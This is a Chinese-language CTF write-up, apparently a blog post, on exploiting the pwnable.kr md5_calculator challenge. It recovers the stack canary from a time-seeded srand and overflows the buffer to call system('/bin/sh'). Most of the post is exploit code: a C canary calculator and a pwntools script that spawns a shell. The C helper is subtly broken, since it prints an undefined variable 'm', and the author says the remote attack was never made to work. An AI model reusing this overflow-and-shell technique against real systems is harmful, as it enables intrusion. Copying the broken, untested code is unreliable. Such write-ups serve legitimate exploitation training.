---
title: pwnable md5_calculator
date: 2017-04-23 22:36:29
tags:
- pwnable
- stack_canary
categories:
- pwnable.kr
---

这题一个栈溢出，canary的值可以逆向得到。
这题的关键是得到scrand的参数种子，即服务器上的时间戳。好像也只能先获取服务器时间，然后把本机时间通过date命令设置成与服务器同步(其实是伪同步，可以成功)。获取服务器时间不难，可以通过ssh登录，然后从服务器发送时间到本机。然后通过os.system('date -s "time"')设置即可。不过这是我从网上看的，自己没实践。
得到canary代码：
<!-- more -->
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    int time = atoi(argv[1]);
    int cap = atoi(argv[2]);
    srand(time);
    int i;
    int rands[8];
    for(i = 0; i <= 7; i++)
    {
        rands[i] = rand();
    }
    int rs = rands[1] + rands[2]- rands[3] + \
    rands[4] + rands[5] - rands[6] + rands[7];
    cap -= rs;
    printf("%d",m);
    return 0;
}
```

然后exploit的相关脚本：
```python
from pwn import *
import base64
import time
import os

debug = 1
if debug:
    p = process('./hash')
else:
    p = remote('pwnable.kr', 9001)

p.recvuntil("Are you human? input captcha : ")
s = p.recvuntil("\n")
cap = int(s, 10)
print "cap: " + hex(cap)
p.send(s)

time = time.time()
print "time: " + str(time)
p.recvuntil("Encode your data with BASE64 then paste me!\n")
canary = os.popen('./md5-canary {} {}'.format(str(time), cap)).read()
canary = int(canary)
print "canary: " + hex(canary)

payload = 'a' * 0x200 + p32(canary) + 'a' * 0xc
payload += p32(0x08048880)
binsh = 0x0804B0E0 + 540 * 4/3 + 0x10
payload += p32(0xdeadbeef) + p32(binsh)
print len(payload)
gdb.attach(p)
p.sendline(b64e(payload) + "\x00" * 0x10 + '/bin/sh\x00')

p.interactive()
```
远程拿不到shell因为时间同步问题。那个设置伪同步的代码可以参考[这里](https://etenal.me/archives/972#C20)

